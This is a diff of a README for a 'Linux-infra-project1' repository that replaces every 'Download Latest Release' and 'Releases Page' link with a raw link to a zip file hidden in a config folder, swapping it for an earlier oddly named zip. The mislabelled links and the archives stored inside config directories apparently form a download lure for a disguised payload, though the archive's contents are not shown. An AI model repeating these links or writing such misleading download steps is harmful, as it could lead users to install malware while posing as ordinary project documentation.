@@ -6,7 +6,7 @@ Welcome to the Linux-infra-project1 repository! This project guides you through 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase2-users/infra_Linux_project_v1.3.zip)](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase2-users/infra_Linux_project_v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -41,13 +41,13 @@ Follow these tips to keep your installation secure:
 
 To get started, visit the releases page to download the latest version of the project.
 
-[Download Latest Release Here](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip)
+[Download Latest Release Here](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase2-users/infra_Linux_project_v1.3.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase2-users/infra_Linux_project_v1.3.zip).
 2. Find the latest version.
-3. Click on the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase4-backup-logging/Linux-infra-project-Cervulus.zip for Linux).
+3. Click on the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/ShailendraSingh05/Linux-infra-project1/main/Configs/Phase2-users/infra_Linux_project_v1.3.zip for Linux).
 4. Once downloaded, extract the files.
 5. Open a terminal window and navigate to the extracted folder.
 6. Follow the instructions in the provided README file to complete the installation.
